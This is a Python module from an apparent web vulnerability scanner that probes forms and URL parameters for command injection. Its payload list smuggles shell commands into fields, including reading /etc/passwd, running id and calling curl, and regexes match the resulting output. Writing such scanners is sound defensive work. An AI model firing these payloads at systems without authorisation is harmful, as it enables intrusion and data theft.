"""
Command Injection Scanner Module
"""

import re
import requests
import time
from scanner_modules.url_utils import with_param
from urllib.parse import urlparse, urljoin, quote, parse_qs

class CommandInjectionScanner:
    def __init__(self, base_url, session):
        self.base_url = base_url.rstrip('/')
        self.domain = urlparse(base_url).netloc
        self.session = session
        self.findings = []
        
        # Command Injection payloads
        self.cmd_payloads = [
            ";ls",
            "|ls",
            "&ls",
            "$(ls)",
            "`ls`",
            ";whoami",
            "|whoami",
            "&whoami",
            ";id",
            "|id",
            "&id",
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "&cat /etc/passwd",
            ";sleep 5",
            "|sleep 5",
            "&sleep 5",
            ";curl http://example.com",
            "|curl http://example.com",
            "&&echo test",
            ";echo test",
            "|echo test",
            ";ping -c 5 127.0.0.1",
            "|ping -c 5 127.0.0.1",
            "&ping -c 5 127.0.0.1",
            ";$whoami",
            ";$id",
            ";/bin/ls",
            ";/usr/bin/id",
            "ping -n 5 127.0.0.1",
            "ping -c 5 127.0.0.1",
            "dir",
            "type C:\\windows\\win.ini",
            "type /etc/passwd",
            "uname -a",
        ]
        
        # Detection patterns
        self.detection_patterns = [
            r"root:.*:0:0:",
            r"daemon:.*:/dev/null",
            r"Linux",
            r"uid=",
            r"gid=",
            r"\[boot loader\]",
            r"Windows",
            r"volume in drive",
            r"inet addr",
            r"PING.*statistics",
            r"bytes from",
            r"linux version",
            r"kernel version",
            r"#/bin/bash",
            r"#/bin/sh",
        ]

    def test_parameter(self, url, param_name, method='GET'):
        """Test parameter for command injection"""
        findings = []
        
        try:
            # Time-based detection
            start_time = time.time()
            if method == 'GET':
                self.session.get(url, timeout=10)
            else:
                self.session.post(url, data={}, timeout=10)
            base_time = time.time() - start_time
        except:
            base_time = 0
        
        for payload in self.cmd_payloads:
            try:
                # Time-based detection
                start_time = time.time()
                if method == 'GET':
                    test_url = url.replace(f"{param_name}=", f"{param_name}={quote(payload)}")
                    response = self.session.get(test_url, timeout=10)
                else:
                    response = self.session.post(url, data={param_name: payload}, timeout=10)
                execution_time = time.time() - start_time
                
                # Check for significant delay
                if execution_time > 5:
                    findings.append({
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'title': f'Command Injection vulnerability (Time-based)',
                        'description': f'Command injection vulnerability detected in parameter "{param_name}". Server-side command execution is possible.',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f'Execution time: {execution_time:.2f}s (payload: {payload})',
                        'remediation': 'Never pass user input to system commands. Use whitelist validation. Use programming language APIs instead of shell commands. Implement proper input validation and sanitization.'
                    })
                    return findings  # Stop testing this parameter
                
                # Check for command output
                for pattern in self.detection_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        findings.append({
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'title': f'Command Injection vulnerability detected',
                            'description': f'Command injection vulnerability detected in parameter "{param_name}". Server-side command output is reflected in the response.',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'Pattern matched: {pattern}',
                            'remediation': 'Never pass user input to system commands. Use whitelist validation. Use secure APIs instead of shell execution.'
                        })
                        return findings  # Stop testing this parameter
                        
            except Exception as e:
                continue
        
        return findings

    def scan(self):
        """Main scanning function"""
        try:
            # Get initial page
            response = self.session.get(self.base_url, timeout=10)
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()
                
                if action:
                    if action.startswith('http'):
                        form_url = action
                    else:
                        form_url = urljoin(self.base_url, action)
                else:
                    form_url = self.base_url
                
                inputs = form.find_all(['input', 'textarea'])
                
                for input_field in inputs:
                    param_name = input_field.get('name')
                    if param_name:
                        results = self.test_parameter(form_url, param_name, method)
                        self.findings.extend(results)
            
            # Test URL parameters
            parsed = urlparse(self.base_url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param_name in params.keys():
                    results = self.test_parameter(self.base_url, param_name)
                    self.findings.extend(results)
            
            # Test common parameters
            common_params = ['cmd', 'command', 'exec', 'execute', 'system', 'shell', 'ping', 'query']
            for param in common_params:
                test_url = with_param(self.base_url, param, "test")
                results = self.test_parameter(test_url, param)
                self.findings.extend(results)
            
        except Exception as e:
            print(f"Command injection scanning error: {e}")
        
        return self.findings
